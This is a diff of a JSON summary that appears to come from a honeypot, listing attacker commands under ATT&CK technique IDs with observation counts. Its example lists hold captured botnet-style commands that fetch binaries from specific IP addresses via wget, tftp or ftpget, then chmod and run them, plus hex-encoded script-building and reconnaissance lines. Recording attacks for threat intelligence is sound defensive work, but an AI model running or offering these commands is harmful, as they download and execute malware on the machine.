@@ -1,5 +1,4 @@
 {
-  "schema_version": "1.0",
   "techniques": [
     {
       "id": "T1027",
@@ -11,11 +10,11 @@
       "count": 75347,
       "distinct_ips": 162,
       "examples": [
+        "echo -e \"\\x6F\\x6B\"",
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-        "/bin/busybox echo -ne \"\\x23\\x21\\x2F\\x62\\x69\\x6E\\x2F\\x73\\x68\\x0A\\x0A\\x66\\x6F\\x72\\x20\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x20\\x69\\x6E\\x20\\x2F\\x70\\x72\\x6F\\x63\" > .k",
-        "/bin/busybox echo -ne \"\\x2F\\x2A\\x3B\\x20\\x64\\x6F\\x0A\\x20\\x20\\x20\\x20\\x70\\x69\\x64\\x3D\\x24\\x7B\\x70\\x72\\x6F\\x63\\x5F\\x64\\x69\\x72\\x23\\x23\\x2A\\x2F\\x7D\\x0A\\x0A\" >> .k",
-        "/bin/busybox echo -ne \"\\x20\\x20\\x20\\x20\\x72\\x65\\x73\\x75\\x6C\\x74\\x3D\\x24\\x28\\x6C\\x73\\x20\\x2D\\x6C\\x20\\x22\\x2F\\x70\\x72\\x6F\\x63\\x2F\\x24\\x70\\x69\\x64\\x2F\\x65\" >> .k",
-        "/bin/busybox echo -ne \"\\x78\\x65\\x22\\x20\\x32\\x3E\\x20\\x2F\\x64\\x65\\x76\\x2F\\x6E\\x75\\x6C\\x6C\\x29\\x0A\\x0A\\x20\\x20\\x20\\x20\\x69\\x66\\x20\\x5B\\x20\\x22\\x24\\x72\\x65\" >> .k"
+        "echo -e \"\\x47\\x41\\x59\"",
+        "cat /proc/mounts; echo -e \"\\x47\\x41\\x59\"",
+        "echo -e '\\x6b\\x61\\x6d\\x69/dev' > /dev/.nippon; cat /dev/.nippon; rm /dev/.nippon"
       ]
     },
     {
@@ -48,8 +47,8 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
         "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l tftp.sh;chmod 777 tftp.sh && sh tftp.sh;rm -rf ftp.sh;/bin/busybox ftpget 2.26.136.128 -P 8121 ftp.sh ftp.sh;chmod 777 ftp.sh && sh ftp.sh;",
-        "cd /tmp||cd /var/run||cd /mnt||cd /root||cd /;(wget -q -O 1.sh http://198.144.179.82:80/1.sh||busybox wget -q -O 1.sh http://198.144.179.82:80/1.sh||curl -so 1.sh http://198.144.179.82:80/1.sh)&&chmod 777 1.sh&&sh 1.sh;echo ok"
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; rm -rf pmips",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64; rm -rf x86_64"
       ]
     },
     {
@@ -180,6 +179,6 @@
       ]
     }
   ],
-  "total_commands": 206716,
+  "total_commands": 207427,
   "matched_commands": 78792
 }
